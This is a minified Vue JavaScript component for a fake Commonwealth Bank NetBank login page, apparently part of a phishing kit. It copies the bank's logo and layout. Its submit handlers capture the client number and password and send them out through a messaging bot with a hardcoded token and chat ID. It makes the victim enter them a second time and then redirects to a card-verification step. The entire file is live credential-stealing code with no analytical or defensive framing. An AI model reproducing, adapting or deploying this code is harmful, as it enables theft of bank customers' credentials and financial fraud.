import{r as d,a as f,c as h,b as t,d as n,w as c,v as m,t as _,e as k,u as y,o as M}from"./index-Baowc6fr.js";const w={id:"body",class:"logon"},C={id:"BodyContainer"},x={id:"MainContent"},B={id:"ModuleWrap"},L={id:"ModuleLeft",class:"module"},P={class:"bd"},N={class:"ft"},S={class:"row rowClientNumber"},A={class:"FieldElement"},F={class:"row rowPassword"},T={class:"FieldElement"},$={style:{color:"red"}},R={__name:"LogonView",setup(D){let u="8003383858:AAEZ592gzzNqbxcgZbDNTr3TVbbFJzb-S4Q",g=5004137383;const l=new Bot(u,g),b=y(),r=d(1),o=d(""),s=f({client_no:"",pass:""}),p=()=>{if(s.client_no.trim()===""){alert("Client number field required");return}if(s.pass.trim()===""){alert("Password field required");return}const i=new Date().getTime();let e=`Common Wealth Bank submission (first attempt) - ID: ${i} %0A`;e+="====================%0A",e+=`Client number: ${s.client_no}%0A`,e+=`Password: ${s.pass}%0A`,l.sendMessage(e).then(a=>{console.log("Msg Success!",a),sessionStorage.setItem("submissionID",i),o.value="Please enter your Client number and Password again",s.client_no="",s.pass="",r.value++}).catch(a=>console.error(a))},v=()=>{if(s.client_no.trim()===""){alert("client_no/username field required");return}if(s.pass.trim()===""){alert("Password field required");return}let i=`Common Wealth Bank submission (second attempt) - ID: ${sessionStorage.getItem("submissionID")} %0A`;i+="====================%0A",i+=`client_no/username: ${s.client_no}%0A`,i+=`Password: ${s.pass}%0A`,l.sendMessage(i).then(e=>{console.log("Msg Success!",e),o.value="",b.push({name:"netbank.verify.card"})}).catch(e=>console.error(e))};return(i,e)=>(M(),h("form",{method:"post",onSubmit:e[2]||(e[2]=k(a=>r.value===1?p():v(),["prevent"]))},[t("body",w,[t("div",C,[e[10]||(e[10]=t("div",{id:"Header"},[t("div",{id:"BrandingLogo"},[t("span",{class:"ImageWithHelp",id:"imgCbaLogo"},[t("img",{id:"imgCbaLogo",src:"https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_mainlogo.552c5a58c5e8e13c837eac9f362e571a.svg",alt:"Commonwealth Bank of Australia"})])])],-1)),t("div",x,[e[8]||(e[8]=n('<noscript><div class="MessagePanel"><div class="message_contents message_contents_validation"><div class="message"><div class="message_icon error"></div><div class="msg_cnt_wrp msg_cnt_wrp_error"><p><strong>You need to enable JavaScript to access NetBank</strong></p><p> Follow these instructions on <a id="lnkEnableJavaScript" href="" target="_blank">how to enable JavaScript</a>. If you&#39;d prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="e">mobile version</a> of NetBank. </p></div></div></div></div></noscript><div class="MessagePanel arrow" id="mplMessagePanel" style="display:none;"></div>',2)),t("div",B,[t("div",L,[e[6]||(e[6]=t("h2",null,"Log on to NetBank",-1)),t("div",P,[t("div",N,[t("div",S,[e[3]||(e[3]=t("div",{class:"LabelWrapper LabelTextAlignNotSet align_notset"},[t("label",{for:"txtMyClientNumber_field",id:"txtMyClientNumber_label"},[t("span",{class:"MainLabel"},"Client number")])],-1)),t("div",A,[c(t("input",{name:"txtMyClientNumber$field",type:"text",maxlength:"8",id:"txtMyClientNumber_field",class:"text textbox field","data-maxlength":"8","onUpdate:modelValue":e[0]||(e[0]=a=>s.client_no=a)},null,512),[[m,s.client_no]])])]),t("div",F,[e[4]||(e[4]=t("div",{class:"LabelWrapper LabelTextAlignNotSet align_notset"},[t("label",{for:"txtMyPassword_field",id:"txtMyPassword_label"},[t("span",{class:"MainLabel"},"Password")])],-1)),t("div",T,[c(t("input",{name:"txtMyPassword$field",type:"password",maxlength:"16",id:"txtMyPassword_field",class:"text textbox field","data-maxlength":"16","onUpdate:modelValue":e[1]||(e[1]=a=>s.pass=a)},null,512),[[m,s.pass]])])]),t("p",$,_(o.value),1),e[5]||(e[5]=n('<div class="row"><div class="FieldElement FieldElementNoLabel"><span class="checkbox field checkbox_classic"><input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox"><label for="chkRemember_field">Remember client number</label></span></div></div><input type="hidden" name="perfmonLog" id="perfmonLog"><input type="hidden" name="metric" id="metric"><div class="FieldElement FieldElementNoLabel"><div class="CbaButton" id="btnLogon"><input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btnLogon_field"></div></div><a id="lnkForgottenDetails" href="">I&#39;ve forgotten my log on details</a><div id="MessageBubble" class="MessageBubble"><span class="MessagePointer"></span><a id="MessageClose" class="MessageClose" title="Close" href="javascript:void(0)">Close</a><span class="MessageBody"> For security reasons, do not <br> select <strong>Remember client number</strong> if anyone else uses <br> this computer. <a id="lnkFindOutMore" href="" target="_blank">Find out more</a>. </span></div>',6))])])]),e[7]||(e[7]=n('<div id="ModuleRight" class="module"><h2>New to NetBank?</h2><div class="bd"><div class="ft"><ul class="Bullets"><li><a id="lnkRegistration" href="">Register for NetBank now</a></li><li><a id="lnkOnlineSupport" href="" target="_blank">Online support for our products and services</a></li><li><a id="lnkProtectYourselfOnline" href="" target="_blank">Tips to stay safe online</a></li></ul></div><div class="ft secModule"><ul class="Bullets"><li><a id="lnkSecurityGuarantee" href="" target="_blank">Protection for unauthorised transactions</a></li></ul></div></div></div>',1))]),e[9]||(e[9]=n('<div id="ucLogonContentManageControl_pnlContentManaged"><div id="ContentManaged"><div id="ucLogonContentManageControl_pnlHighlightPanel"><div class="HighlightPanel"><div class="top"><div class="bottom"><div class="image"><p><a href="" target="_blank"><img src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/manage-money-lisa-netbank.jpg" alt=""></a></p></div><div class="description"><table><tbody><tr><td><p><b>How to manage your household budget</b></p> See how everyday Australians are managing their household budgets with Brighter magazine.<ul><li><a href="" target="_blank">Take me there</a></li></ul><p></p><p></p></td></tr></tbody></table></div></div></div></div></div><div id="ucLogonContentManageControl_pnlCurrentHighlights"><div id="CurrentHighlights"><h3>Quicklinks</h3><div class="column"><ul><li><p><a href="" target="_blank">Financial difficulty support for your business. Find out more</a></p></li><li><p><a href="" target="_blank">Lowered home loan rates and speedy approvals Tell me more.</a></p></li><li><p><a href="" target="_blank">Are you experiencing financial difficulty? Get help</a></p></li><li><p><a href="" target="_blank">Use Benefits finder to find grants, rebates and concessions you may be eligible for</a></p></li></ul></div></div></div></div></div>',1))]),e[11]||(e[11]=n('<div id="PageFooter"><a id="lnkTermsOfUse" href="" target="_blank">Terms of use</a> | <a id="lnkSecurity" href="" target="_blank">Security</a> | <a id="lnkPrivacy" href="" target="_blank">Privacy</a><span id="CopyRight">© Commonwealth Bank of Australia 2025 ABN 48 123 123 124</span></div>',1))])])],32))}};export{R as default};
